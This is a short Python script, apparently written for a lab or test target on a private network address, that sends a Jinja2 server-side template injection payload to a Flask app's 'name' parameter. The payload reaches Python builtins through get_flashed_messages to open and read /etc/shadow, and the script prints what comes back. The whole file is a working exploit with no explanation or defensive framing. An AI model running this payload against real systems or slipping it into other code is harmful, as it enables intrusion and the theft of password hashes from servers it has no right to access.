from pip._vendor import requests

r = requests.get('http://192.168.0.114:5000/app?name={{get_flashed_messages.__globals__.__builtins__.open(%27/etc/shadow%27).read()}}')


print(r.text)